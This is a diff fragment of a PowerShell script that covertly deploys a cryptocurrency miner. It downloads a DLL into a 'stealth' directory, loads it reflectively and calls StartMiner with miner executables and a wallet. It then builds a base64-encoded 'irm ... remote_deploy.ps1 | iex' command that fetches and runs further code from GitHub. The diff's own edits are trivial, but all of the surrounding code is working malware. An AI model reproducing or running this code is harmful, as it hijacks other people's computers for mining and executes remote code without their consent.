@@ -84,7 +84,7 @@ if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     }
 }
 
-$DllPath = Join-Path $StealthDir "Bridge.dll"
+$DllPath = [System.IO.Path]::Combine($StealthDir, "Bridge.dll")
 if (Get-StealthFile $DllUrl $DllPath) {
     try {
         $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
@@ -93,7 +93,7 @@ if (Get-StealthFile $DllUrl $DllPath) {
         $startMethod = $loader.GetMethod("StartMiner")
         $GArg = if ($GpuDetected) { $GpuExe } else { "" }
         $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GArg, [string]$Wallet))
-        
+        Write-Host "running"
         $Command = "irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex"
         $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
         $Encoded = [Convert]::ToBase64String($Bytes)
